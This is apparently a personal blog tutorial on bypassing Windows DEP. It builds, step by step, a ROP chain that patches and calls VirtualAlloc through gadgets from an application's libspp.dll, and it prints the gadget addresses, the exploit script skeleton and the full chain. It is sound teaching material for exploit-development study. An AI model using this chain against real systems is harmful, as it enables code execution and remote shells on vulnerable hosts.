---
title:  "ROP Till You Drop: Bypassing DEP with Style using VirtualAlloc"
date:   2024-01-xx
tags: [posts]
excerpt: "Building ROP chains to bypass Data Execution Protection while using VirtualAlloc"
---

# Introduction

One topic that has always interested me was exploit development. I was always mesmerized by how hackers manipulated applications into making them do what they wanted. Where did these individuals who crafted such exploits learn this dark art? Sometimes during my journey it felt like I was sitting in Hogwarts, listening to Professor Snape explain how leaking a memory address can lead to an ASLR bypass but in reality I wasn't at Hogwarts, I was in my basement and I wasn't in an Dark Arts course, I was in Exploit Development course that at sometimes I would have to read a chapter seven or eight times before I even remotely understood the topic being taught.

I have come to the realization that anyone is capable of learning anything. Follow a methodology closely enough and you will be successful 90% of the time (*60% of the time, it works every time*). But sometimes the real learning happens when you're pushed out of your comfort zone and you're forced to work through problems that only you've created, and that's where the real learning is done.

Exploit development has become a "hobby" of mine, you certainly won't find my name plastered in the hall of the fame of ex dev's and probably won't ever see my name listed alongside a badass CVE that wreak havoc on the blue team's holiday break. However, what I get from it, is the satisfaction of reading in depth technical analysis of exploit chains and understanding from start to finish the mindset and technical capability of such an attack. For me, this makes me better at what I do and gives me the confidence to tackle topics I may not fully understand yet.

With all that out of the way, lets tackle a topic I recently took a deep dive into. Bypassing DEP using ROP chains. This topic itself can get pretty in the weeds so we'll take it slow and hopefully one or two of the few people reading this walk away with a little extra knowledge!

## DEP Theory

Before we can even begin understanding how to bypass the thing, we need to have some understanding of what the thing is. DEP or Data Execution Protection or NX-Bit (No Execute Bit) Protection was created to prevent arbitrary code from being executed in an non-executable memory region. When we think back to classic Buffer Overflows, we placed our shellcode and stack and let it rip, in modern software and operating systems that is no longer the case as the stack is marked as a non executable region. 

DEP runs in four different modes:
+ OptIn
+ OptOut
+ AlwaysOn
+ AlwaysOff

We won't cover the understanding of each one, as for this blog we are only focused on one in particular, **AlwaysOn**. In modern Windows deployments such as Windows Server 2016 and on, Data Execution Protection is set to **AlwaysOn**. That means that software compiled without DEP will still be entitled to DEP protection from the operating system thus eliminating any previously public exploits.

In addition to the four modes of DEP, there are also two versions as well:
+ Software enforced DEP
+ Hardware enforced DEP

The **AlwaysOn** mode utilizes Hardware enforced DEP. This hardware enforced version of DEP is a security feature implemented at the CPU level. It uses the NX-Bit to set whether a page of memory is executable or not. If a page of memory is marked as non-executable, any attempt to execute code will cause an exception, preventing the execution of injected malicious code.

DEP provides a significant challenge for exploit developers, as it prevents the execution of code in areas of memory typically used for exploitation, such as the stack and the heap. Throughout the years many different techniques have been developed to bypass DEP, one of the most notable is the use of Return Oriented Programming (ROP).

## Hey Harry, is this ROP Soaked in Kerosene?

ROP in my opinion is considered an advanced exploitation technique. Instead of injecting and executing new code, ROP manipulates the control flow of a program by executing small snippets of existing code. This small snippets are known as **"gadgets"** and they're already present in the program or it's libraries. Throughout this blog post, we will encounter an application compiled with DEP protection and from there we will identify a library suitable for finding ROP gadgets. One of the key components of this process is finding a library that is not compiled with Address Space Layout Randomization (ASLR) and another being that the address of the module does not contain **null** bytes.

## Have to Start Somewhere

In starting to develop a fresh exploit for a either a pre-existing buffer overflow or developing a new one that simply must bypass DEP, a few considerations should be made. One of those being, how will we make an area of memory executable on the stack or in the heap? There are many methods and Windows APIs that do this but this article will focus on one, `VirtualAlloc`.

```c++
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

`VirtualAlloc` is an interesting choice because it only takes four parameters and three of them are fairly straight forward to set. We will cover each one individually as we go on and build our exploit. The first and foremost step is to obtain the address of `VirtualAlloc` from kernel32.dll. This poses a significant problem as well. As you'll see, we will be using ROP gadgets from a DLL that was not compiled with ASLR, meaning the address of the library will not change. This makes our exploit portable from different versions of the OS as the application will always load "some.dll" at base address `0x10000000`. However, this is not the case for windows DLLs like kernel32.dll, these are compiled with ASLR and the address will change from iteration to iteration of the application. Luckily, we have a method to deal with this.

Let's get our application loaded and hooked into WinDbg to get a closer look at the modules presented the choices we have:

<img src="/images/VA_1.png" alt=""> 

As mentioned there's only one suitable option and that is `libspp.dll`. This module is loaded at a base address of `0x10000000` and does not contain null bytes as the other modules do. To extract all the rop gadgets from this module we will utilize `rp++` -- [https://github.com/0vercl0k/rp] --, and the command will go something like this :`rp-win-x64.exe -f libspp.dll -r 5 > libspp_rops.txt`

Our text file will look like this:
```text
Trying to open 'libspp.dll'..
Loading PE information..
FileFormat: PE, Arch: Ia32
Using the Nasm syntax..

Wait a few seconds, rp++ is looking for gadgets..
in .text
191631 found.

A total of 191631 gadgets found.
0x10013db6: aaa  ; adc al, 0x00 ; add esp, 0x08 ; call eax ;  (1 found)
0x10033d5f: aaa  ; adc al, byte [eax] ; add esp, 0x08 ; call eax ;  (1 found)
...[snip]
0x1008132a: lahf  ; add eax, 0xB85E5F00 ; add dword [eax], eax ; add byte [eax], al ; pop ebx ; ret  ;  (1 found)
0x10077e9d: lahf  ; fdiv st7, st0 ; inc dword [ebp+0x5F0B75C0] ; pop esi ; add esp, 0x00000104 ; retn 0x0004 ;  (1 found)
0x100110dc: lahf  ; lgdt  [eax] ; sbb eax, 0xE1100110 ; lgdt  [eax] ; ret  ;  (1 found)
0x100bd192: lahf  ; or dword [eax], eax ; add esp, 0x04 ; mov eax, esi ; pop esi ; retn 0x0004 ;  (1 found)
0x10114679: lahf  ; pop ds ; adc al, ch ; mov ecx, 0x8300042E ; les ecx,  [eax] ; call eax ;  (1 found)
```

Pretty simple right? For what it's worth, rp++ retrieved over 190,000 gadgets. Granted most of them are repeat gadgets, which brings down our total number to around 30,000 but not all of these gadgets will be beneficial to us, as we will see shortly some will alter the stack irreversibly and will simply break our exploit.

At this point we know a few things:
+ The Windows API we will use to bypass DEP
+ The module will we use to find suitable gadgets

Next on the list is to find the address of `VirtualAlloc` in a way that will compensate for the fact the address changes on every iteration of the application. Before we jump into that, lets go over to VSCode and start getting a skeleton of exploit down. In the interest of time, I've skipped the fuzzing for bad characters portion.

```python
#!/usr/bin/python
import socket
import sys
import argparse
from struct import pack

try:
    # A nice way to set up arguments for our script
    parser = argparse.ArgumentParser(description='VirtualAlloc DEP Bypass')
    parser.add_argument('--server', required=True, help='IP address of the server')
    parser.add_argument('--port', type=int, default=80, help='Port number (default: 80)')

    args = parser.parse_args()

    server = args.server
    port = args.port
    size = 800

    # BADCHARS = 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D

    # VirtualAlloc skeleton
    virtualAlloc  = pack("<L", (0x60606060)) # dummy VirtualAlloc Address
    virtualAlloc += pack("<L", (0x61616161)) # Shellcode Return Address
    virtualAlloc += pack("<L", (0x62626262)) # dummy lpAddress
    virtualAlloc += pack("<L", (0x63636363)) # dummy dwSize
    virtualAlloc += pack("<L", (0x64646464)) # dummy flAllocationType
    virtualAlloc += pack("<L", (0x65656565)) # dummy flProtect
```

Now that this is squared away, we can finally start the process of finding where `VirtualAlloc` is tucked away in this application. The key to finding this is to use the Import Address Table (IAT) of `libspp.dll`

WinDbg command: `!dh 10000000 -f`

<img src="/images/VA_2.png" alt=""> 

In this image we will can see that the IAT is located at `168000` bytes from the base of `libspp`. We can then use the `dps` command to dump the address at that offset and try to resolve them to symbols.

While manual methods are always fun and a great way to learn, these things can be automated easily with WinDbg's `pykd` integration. Below is the output that highlights exactly what we need. Because` VirtualAlloc` is not resolved by the application, we can use a different import function from `kernel32.dll` such as `WriteFile` and then dereference it. Once we dereference it, we can use an offset to this value to obtain the actual address of `VirtualAlloc`! While the base addresses of `WriteFile` and `VirtualAlloc` changes, what does not change is the offset between these two imported functions in the IAT. So in this example we can obtain the address of `VirtualAlloc` by adding a large negative to `WriteFile`,  and why the large negative value? To avoid null bytes.

<img src="/images/VA_3.png" alt=""> 

As good practice I like to add this to my python script in the comments, as we'll see shortly, it's very easy to lose where you are in your exploit change:
```python
    #[+] 0x101680b0 (WriteFile IAT entry)
    #[+] 0x76d54020 (WriteFile resolved)
    #[+] 0x76d4ff00 (VirtualAllocStub resolved)
    #[+] -0x4120 (offset = VirtualAllocStub - WriteFile)
    #[+] 0xffffbee0 (negative)
```

Now that we're armed with the information needed to succeed and the exact location of where `VirtualAlloc` resides, we can effectively start building our ROP chain. The goal of the ROP chain is simple, patch the arguments on the stack for the `VirtualAlloc` API and then once it's all set, make a call to `VirtualAlloc` to execute and change the memory permissions of the pre-determined section of memory on the stack from `READ` to `EXECUTE`.

## ROP Chains

The first step in our ROP chain is get a working copy of the `ESP` register into another register. In our list of gadgets one stands out that get's the job done:

`0x10154112: push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;`

In this gadget we are pushing the contents of `ESP` to the stack and performing two other instructions that do not matter to us. This is perfectly acceptable and sometimes neccessary. With ROP gadgets you won't always find one that does exactly what you need it to do, so as long as the other "junk" instructions don't mess up the flow of the application then it is fair game. In this gadget the two that do matter are `psuh esp` and `pop esi`, which will take the value we pushed onto the stack from `ESP` and place it into `ESI`.

<img src="/images/VA_4.png" alt=""> 

Above we can see the output from WinDbg that confirms our method, after executing that gadget we effectively copied the value from `ESP` into `ESI`.

### Getting the address for VirtualAlloc

With a copy of `ESP` in `ESI` we can start chaining together some gadgets to retrieve the address of `VirtualAlloc`. Below are the ROP gadgets along with their associated assembly (ASM) instructions:
```python
    #[--Getting address for VirtualAlloc--]
    rop += pack("<L", (0x10052048))  # mov eax, esi ; pop esi ; retn 0x0004 ;
    rop += pack("<L", (0x41414141))  # alignment for ESI
    rop += pack('<L', (0x10154336))  # pop ebp ; ret ;
    rop += pack("<L", (0x41414141))  # alignment for ret 0x04
    rop += pack("<L", (0xffffffe0))  # value for ebp to add to eax (-0x20) (skeleton alignment)
    rop += pack('<L', (0x100fcd71))  # add eax, ebp; dec ecx ; ret
    rop += pack('<L', (0x100cb4d4))  # xchg eax, edx ; ret ;
    rop += pack('<L', (0x1002f729))  # pop eax ; ret ; 
    rop += pack('<L', (0xffffbee0))  # Neg offset to VirtualAlloc
    rop += pack('<L', (0x1014426e))  # xchg eax, ebp ; ret ; 
    rop += pack('<L', (0x1002f729))  # pop eax ; ret ; 
    rop += pack('<L', (0x101680b0))  # Address of WriteFile in the IAT of libspp.dll
    rop += pack('<L', (0x1014dc4c))  # mov eax, [eax] ; ret ; 
    rop += pack('<L', (0x100fcd71))  # add eax, ebp ; dec ecx ; ret ; 
    rop += pack('<L', (0x1012d24e))  # mov [edx], eax ; ret ; 
```

Let's break this down. We first move our copied `ESP` registered from `ESI` to `EAX`. This is done because we will see `EAX` is a much more manageable register to work with. `EAX` is an accumulator register, so a lot of arithmetic operations happen at this register, which will see shortly is something that needs to be done. One the value is moved to `EAX` we pop the value of `ESI` off the stack and replace with junk bytes, in this case `0x41414141`. This is a must, but why? When dealing in exploit development, specifically ROP chains, stack alignment is crucial. . This value `0x41414141` is used to maintain the correct structure and alignment of the ROP chain, ensuring that the control flow proceeds as intended. With each ROP gadget we issue a `ret` instruction, returning us to the next item on the stack. If we go back to basics, we know that the stack is a Last In First Out (LIFO) structure and while the  specific value (`0x41414141`) is not crucial; its purpose is to occupy space on the stack so that subsequent gadgets receive the correct values in the correct registers.

Once that move happens, we `pop` the value `0xffffffe0` into `EBP`, this value is however crucial and takes a sentence or two to explain. In this very moment, we control execution flow of the application. We have performed a buffer overflow that gave us full control of `EIP`, if this sounds new to you, a refresher on Buffer Overflows would probably serve you well. As we load the junk data into our buffer, we explicitly loaded dummy data on the stack. These dummy items are representative of the values we need to fully patch the `VirtualAlloc` API and call it to change the permissions of the memory region. At this point, we need to know exactly how far away on the stack these values are from `ESP`. This can easily be done in WinDbg, when the crash occurs and you simply subtract ESP from the distance of this dummy data.  

<img src="/images/VA_5.png" alt=""> 

As you see with this value of `-20` we can correctly land on the spot where we will be placing the address to `VirtualAlloc`. We can use the `.formats` feature in WinDbg to obtain the correct value `0xffffffe0`

<img src="/images/VA_6.png" alt=""> 

Moving on we then add this value in `EBP` to our current value in `EAX` (the copied `ESP` address), we do this to perform the same arithmetic just displayed, to land right in that spot where our dummy data will be patched. We then do a `xchg eax, edx`, to move the updated value of `EAX` into `EDX` so that we can reuse our `EAX` as it's easier to work with that some others. We then `pop eax` with the value for our offset to `VirtualAlloc`. We then perform another exchange `xchg eax, ebp` and then pop the address of the `WriteFile` IAT into `EAX`. 

Once this is done, we dereference the value at `EAX` and store it in `EAX`.  This set of assembly instructions moves the data from the memory location pointed to by the `EAX` register into the `EAX` register itself. In other words, `EAX` is used as a pointer, and the instruction fetches the value from the memory address contained in `EAX` and then stores this value back into `EAX`.  We then add the value stored in `EBP` (the negative offset to `VirtualAlloc`) and then perform a `mov [edx], eax; ret;`. This instruction moves the data in the `EAX` register to the memory location pointed to by the `EDX` register (which will patch the `0x45454545` on the stack).

<img src="/images/VA_7.png" alt=""> 

Now that the address to `VirtualAlloc` is patched, we can move on to the next segment of our ROP chain. One thing is important to make note of here. Since we've effectively copied our `ESP` value into `EDX` at this point, we will need to increment by four to keep the stack aligned and in the correct position for our next argument. For this we could use `rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; ` rop gadget four times consecutively:

```python
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ;
```

Now that we're in the correct location, probably comes the most difficult part of our ROP chain, patching `lpAddress`. The reason why this is the *most* difficult part is because after we patch `lpAddress` on the stack, the other arguments are static values, meaning that they can be easily hardcoded into our script.

### Patching lpAddress

According to Microsoft, `lpAddress` is the starting address of the region to allocate (for us this will also be where our shellcode will begin). While this is an optional parameter for `VirtualAlloc`, if we decide to leave it **NULL** the operating system will determine where to allocate the region and this is of no use to us. To obtain this address, we will jump a predetermined offset away from the stack and eventually place our shellcode here. In doing this, this memory region will be manipulated by `VirtualAlloc` and change the permissions from  **PAGE_READWRITE** to **PAGE_EXECUTE**. We will see in a more granular way once `VirtualAlloc` is fully patched.

Before we can fully patch `lpAddress`, we must patch our shellcode return address which as I mentioned earlier will be the same address. To do this we utilize the following ROP gadgets:

```python
    #[--Patching lpAddress--]
    rop += pack('<L', 0x10129afb)    # mov eax, edx ; 
    rop += pack('<L', 0x10154336)    # pop ebp ; ret ;
    rop += pack('<L', 0xffffff38)    # -0n200 (temporary)
    rop += pack('<L', 0x100cdc7a)    # xchg eax, ebp ; ret  ;
    rop += pack('<L', 0x100fcd71)    # add eax, ebp ; dec ecx ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 
```

The first step we take is move the value from `EDX` our current working stack pointer into `EAX`, as previously said, arithmetic operations just flow better in and out of `EAX` and `ECX` but other registers would work fine to. Once we've moved this value into `EAX`, we then `pop ebp` with an arbitrary value of `-200`. This is an important step and one we will revisit before we execute our payload for the final time. This is an arbitrary number that will be calculated after we run our script and find exactly how far shellcode sits away from the stack. Once that is complete we perform some operations on the values in `EAX` and `EBP` by performing an `ADD` instruction:  `add eax, ebp ; dec ecx ; ret ;`. Then after that we perform `mov [edx], eax; ret;`. This instruction moves the data in the `EAX` register to the memory location pointed to by the `EDX` register (which will patch the `0x61616161` on the stack). This gadget was simple reuse from the previous section and we can begin to see that once the chain begins to form we can reuse and repurpose previously used gadgets. 

<img src="/images/VA_8.png" alt=""> 

Once we've patched the shellcode return address we can now focus on the `lpAddress`. First let's increment `EDX` by `4` again to move along the stack and keep it aligned:

```python    
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ;
```

Now the hard work was already, the value in `EAX` hasn't changed and all we need to do is patch this argument on the stack at this location. So we reuse the previously used gadget : `mov [edx], eax; ret;` to point the value in `EAX` to the memory location pointed to by the `EDX` register.

The full sequence looks like this:
```python
    #[--Patching lpAddress--]
    rop += pack('<L', 0x10129afb)    # mov eax, edx ;
    rop += pack('<L', 0x10154336)    # pop ebp ; ret ;
    rop += pack('<L', 0xffffff38)    # -0n200 (temporary)
    rop += pack('<L', 0x100fcd71)    # add eax, ebp ; dec ecx ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 
```

<img src="/images/VA_9.png" alt=""> 

Now that `lpAddress` and the shellcode return address is patched, we can move to the final arguments of `VirtualAlloc`.

### Patching dwSize

This parameter is very straightforward, simply put it's the size of the region in bytes. The interesting thing about this parameter is that the Windows API `VirtualAlloc` can only change the memory protections on **per page basis** meaning we could supply any number between `0x01 and 0x1000` and it would have the same effect. For our exploit, we will stick with `0x01` or `0x00000001`. This brings up an issue though, any value between `0x00000001` and `0x00010000` will contain **null bytes** and break our exploit. To maneuver around this restriction we can take the two's complement of `0x01` or `0xffffffff` and then retrieve the correct value by negating that.

<img src="/images/VA_10.png" alt=""> 

```python
    #[--Patching dwSize--]
    rop += pack('<L', 0x1012b413)    # pop eax ; ret ;
    rop += pack('<L', 0xffffffff)    # -0x1
    rop += pack('<L', 0x1010ccc3)    # neg eax ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 
```

All we need to do here *after moving 4 places along the stack* is to `pop` this large negative value into `EAX`. Then we can use the `neg eax ; ret;` gadget to transform this value to it's correct value `0x00000001`. We then reuse our memory dereference gadget `mov [edx], eax ; ret ;` to place the correct value in the memory address `EDX` is pointing to which is `0x63636363`.

<img src="/images/VA_11.png" alt=""> 

<img src="/images/VA_12.png" alt=""> 

<img src="/images/VA_13.png" alt=""> 

### Patching flAllocationType

After four paces south down the stack we arrive at `flAllocationType`. This parameter can take a few different options as Microsoft explains in the documentation but for our purposes we are focused on in particular: `MEM_COMMIT`. In `VirtualAlloc` memory allocation involves two main components:
+ Reservation
+ Commitment

**Reservation** is the process of reserving a range of the processes virtual address space without allocating any actual physical storage (`lpAddress`)

**Commitment** is the process of allocating that memory to physical storage.

In other words if you try to access memory that has been reserved but not committed, the program will encounter a memory access violation. For us the numerical value we want to place on the stack is `0x0001000` and we arrive at a similar situation to what we encountered with `dwSize`. Luckily we know how to handle this easily:

```python
    #[--Patching flAllocationType--]
    rop += pack('<L', 0x1012b413) # pop eax ; ret ;
    rop += pack('<L', 0xfffff001) # -0x1001
    rop += pack('<L', 0x1001181d) # dec eax ; ret  ; 
    rop += pack('<L', 0x1010ccc3) # neg eax ; ret ;
    rop += pack('<L', 0x1012d24e) # mov [edx], eax ; ret ; 
```

As mentioned we earlier we `pop` a large negative value into `EAX` that when negated will return the actual value of `0x1000` to us in `EAX`. We once again place the correct value in the memory address `EDX` is pointing to.

<img src="/images/VA_14.png" alt=""> 

One thing to note here, you can see in the gadget we actually popped a value one greater than `0x1000`. We had to do this because the inverse of `0x1000` is actually `0xffffff000` which contains a **null byte**, to offset this we give a small increase and then use a `dec eax` gadget to retrieve the correct value in `EAX`.

### Patching flProtect

Moving along the stack we arrive at the position where we must patch `flProtect`. This parameter for `VirtualAlloc` is responsible for defining the memory protection of the region supplied in `lpAddress`. `flProtect` can take a few different values but the main one we will be focused on is **PAGE_EXECUTE_READWRITE** which enables execute, read-only, or read/write access to the committed region of pages. The numerical value for this enum is `0x00000040`. To place this value on the stack we will need the negative value of it and negate it exactly how we've done for `dwSize` and `flAllocationType`.

```python
    #[--Patching flProtect--]
    rop += pack('<L', 0x1012b413) # pop eax ; ret ;
    rop += pack('<L', 0xffffffc0) # -0x40 (flProtect)
    rop += pack('<L', 0x1010ccc3) # neg eax ; ret ;
    rop += pack('<L', 0x1012d24e) # mov [edx], eax ; ret ;
```

Once again we `pop` a large negative value into `EAX` that when negated will return the actual value of `0x40` to us in `EAX`. We once again place the correct value in the memory address `EDX` is pointing to.

<img src="/images/VA_15.png" alt=""> 

### Aligning the Stack to VirtualAlloc

Right now at this point we've patched all the arguments for `VirtualAlloc` on the stack, our next objective is to realign the stack so that when we call the next instruction / return to the stack we land into `VirtualAlloc` and execute the API.

<img src="/images/VA_16.png" alt=""> 

This stack realignment is pivotal because the current place on the stack we want to return to is the call to `VirtualAlloc()` which is sitting in our `EDX` register. We need to find a way to get the exact location where `VirtualAlloc` resides and place that in our `ESP` register. In the screenshot you notice that I performed some minor subtraction from `EDX`, `dds edx - 14 L6`. So we will need to subtract `14` from our current value in `EDX` and place that value in `ESP`.

To do this isn't difficult, first we will start by moving our current working stack pointer in `EDX` into `EAX`. Then we will `pop` a small negative value into `EBP`. We then add this small negative to `EAX`, essentially moving "backward" towards the call `VirtualAlloc` we've patched on the stack. Finally we will `xchg eax, esp` and `ret`. Once we return to the stack, we will ready to execute `VirtualAlloc`. Below we can see the entire section of the ROP chain:

```python
    #[--Align ESP with VA Skeleton--]
    rop += pack('<L', 0x10129afb) # mov eax, edx ; ret  ; 
    rop += pack('<L', 0x10154336) # pop ebp ; ret ;
    rop += pack('<L', 0xffffffec) # -14
    rop += pack('<L', 0x100fcd71) # add eax, ebp ; dec ecx ; ret ;
    rop += pack('<L', 0x101394a9) # xchg eax, esp ; ret ; 
```

<img src="/images/VA_17.png" alt=""> 

Before we execute the call to `VirtualAlloc`, lets obtain the memory protections of the current `lpAddress`. We can do this in WInDbg with `!vprot <address>` :

<img src="/images/VA_18.png" alt=""> 

Now let's execute `VirtualAlloc`, in WinDbg we can use the `pt` command to skip to the end of the function. Once we hit the `ret` instruction, we can recheck the memory regions of `lpAddress` and verify that the protection for the region has changed from **PAGE_READWRITE** to **PAGE_EXECUTE_READWRITE**.

<img src="/images/VA_19.png" alt=""> 

At this point we should be good to continue execute our program and retrieve our action of objectives (reverse shell or other code execution like calc.exe) but we immediately fall victim to a `Access Violation`. This is not because of DEP but because we're landing on non executable instructions. In other words, we didn't land on our shellcode but rather somewhere else in the buffer. To fix this, we need to go back to when we patched `lpAddress` and adjust the offset. To correctly handle this, we will set a `breakpoint` / `bp` on `0x1012d24e` the memory address of our  `rop += pack('<L', 0x1012d24e) # mov [edx], eax ; ret ;` gadget. We will execute our exploit and catch the crash in WinDbg and proceed with execution once, so we will land of the shellcode return address argument. Once this argument is patched, we will search for our shellcode in memory and calculate the correct offset from the beginning of our shellcode to `lpAddress`. It's good practice to pad our shellcode with `0x90` or `nops` so that we have some flexibility to give or take a few bytes. 



 >**&#x2757;**  A nopsled is a long sequence of NOP (No Operation) instructions leading up to the actual payload. The objective is to land in the NOPsled and slide through the NOPs until it reaches and executes the payload. 


We can see execution paused and the calculations done in WinDbg below:

<img src="/images/VA_20.png" alt=""> 

Once we have our updated offset and we return to our ROP chain we see have a bit of an issue.

```python
    #[--Patching lpAddress--]
    rop += pack('<L', 0x10129afb)    # mov eax, edx ; 
    rop += pack('<L', 0x10154336)    # pop ebp ; ret ;
    rop += pack('<L', 0xffffff38)    # -0n200 (temporary)
    rop += pack('<L', 0x100cdc7a)    # xchg eax, ebp ; ret  ;
    rop += pack('<L', 0x100fcd71)    # add eax, ebp ; dec ecx ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 
```

Once we move `EDX` into `EAX` and `pop` the offset into `EBP` to `add eax, ebp ; dec ecx ; ret ;` we realize that same trick we were using isn't going to work here. So it will be easier to swap a few gadgets out to make this calculation a bit easier on us:

```python
    rop += pack('<L', 0x100cdc7a)    # xchg eax, ebp ; ret  ;
    rop += pack('<L', 0x1002f729)    # pop eax ; ret ;
    rop += pack('<L', 0xfffffe3c)    # pop eax ; ret ;
    rop += pack('<L', 0x1010ccc3)    # neg eax ; ret ;
```

In this scenario, after we move `EDX` into `EAX` we can swap the values of `EAX` and `EBP` and then `pop EBP` with the negative value that we want to negate into the actual value of our offset using `neg eax`. Once this negation is done, we can utilize the rest of our already made ROP chain and achieve the correct offset to land right in the heart of our NOPsled.

This time around let's set a breakpoint on `VirtualAlloc` in WinDbg using `bp kernel32!VirtualAllocStub` and execute our exploit. Once we hit the breakpoint let's use `pt` to finsih exeuction of `VirtualAlloc` and return out of the function and see that we land in a buffer filled with `0x90`'s. Here we can clear our breakpoint with `bc *` and resume execution with `g` and watch the callback for our reverse shell.

<img src="/images/VA_23.png" alt=""> 

<img src="/images/VA_21.png" alt=""> 

<img src="/images/VA_22.png" alt=""> 


I've pasted the entire ROP chain here for you to review and inspect. Could there be ways to optimize this chain, I imagine so. What was fun here was that relied upon manual inspection of gadgets to build a functional ROP chain that called an Windows API. We did not leverage much automated tooling like `mona`. I am firm believer in knowing how to do it the hard way first.

```python
    #[--Begin ROP chain--]
    rop = ""
    rop += pack("<L", (0x10154112)) # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;
    rop += pack("<L", (0x42424242)) # alignment for stack

    #[--Getting address for VirtualAlloc--]
    rop += pack("<L", (0x10052048))  # mov eax, esi ; pop esi ; retn 0x0004 ;
    rop += pack("<L", (0x41414141))  # alignment for ESI
    rop += pack('<L', (0x10154336))  # pop ebp ; ret ;
    rop += pack("<L", (0x41414141))  # alignment for ret 0x04
    rop += pack("<L", (0xffffffe0))  # value for ebp to add to eax (-0x20) (skeleton alignment)
    rop += pack('<L', (0x100fcd71))  # add eax, ebp; dec ecx ; ret
    rop += pack('<L', (0x100cb4d4))  # xchg eax, edx ; ret ;
    rop += pack('<L', (0x1002f729))  # pop eax ; ret ; 
    rop += pack('<L', (0xffffbee0))  # Neg offset to VirtualAlloc
    rop += pack('<L', (0x1014426e))  # xchg eax, ebp ; ret ; 
    rop += pack('<L', (0x1002f729))  # pop eax ; ret ; 
    rop += pack('<L', (0x101680b0))  # Address of WriteFile in the IAT of libspp.dll
    rop += pack('<L', (0x1014dc4c))  # mov eax, [eax] ; ret ; 
    rop += pack('<L', (0x100fcd71))  # add eax, ebp ; dec ecx ; ret ; 
    rop += pack('<L', (0x1012d24e))  # mov [edx], eax ; ret ; 
    #[--WinDbg: dds edx L1 = 0x76d4ff00 KERNEL32!WriteAllocStub--]

    #[--Moving along the stack to shellcode return address / lpAddress--]
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ;

    #[--Patching lpAddress--]
    rop += pack('<L', 0x10129afb)    # mov eax, edx ; ret  ; 
    rop += pack('<L', 0x100cdc7a)    # xchg eax, ebp ; ret  ;
    rop += pack('<L', 0x1002f729)    # pop eax ; ret ;
    rop += pack('<L', 0xfffffe3c)    # pop eax ; ret ;
    rop += pack('<L', 0x1010ccc3)    # neg eax ; ret ;
    rop += pack('<L', 0x100fcd71)    # add eax, ebp ; dec ecx ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4)    # inc edx ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 

    #[--Moving along the stack to dwSize--]
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ;

    #[--Patching dwSize--]
    rop += pack('<L', 0x1012b413)    # pop eax ; ret ;
    rop += pack('<L', 0xffffffff)    # -0x1
    rop += pack('<L', 0x1010ccc3)    # neg eax ; ret ;
    rop += pack('<L', 0x1012d24e)    # mov [edx], eax ; ret ; 

    #[--Moving along the stack to flAllocationType--]
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ;

    #[--Patching flAllocationType--]
    rop += pack('<L', 0x1012b413) # pop eax ; ret ;
    rop += pack('<L', 0xfffff001) # -0x1001
    rop += pack('<L', 0x1001181d) # dec eax ; ret  ; 
    rop += pack('<L', 0x1010ccc3) # neg eax ; ret ;
    rop += pack('<L', 0x1012d24e) # mov [edx], eax ; ret ; 

    #[--Moving along the stack to flProtect--]
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ; 
    rop += pack('<L', 0x100bb1f4) # inc edx ; ret ;

    #[--Patching flProtect--]
    rop += pack('<L', 0x1012b413) # pop eax ; ret ;
    rop += pack('<L', 0xffffffc0) # -0x40 (flProtect)
    rop += pack('<L', 0x1010ccc3) # neg eax ; ret ;
    rop += pack('<L', 0x1012d24e) # mov [edx], eax ; ret ;

    #[--Align ESP with VA Skeleton--]
    rop += pack('<L', 0x10129afb) # mov eax, edx ; ret  ; 
    rop += pack('<L', 0x10154336) # pop ebp ; ret ;
    rop += pack('<L', 0xffffffec) # -14
    rop += pack('<L', 0x100fcd71) # add eax, ebp ; dec ecx ; ret ;
    rop += pack('<L', 0x101394a9) # xchg eax, esp ; ret ; 
```

## That's a ROP

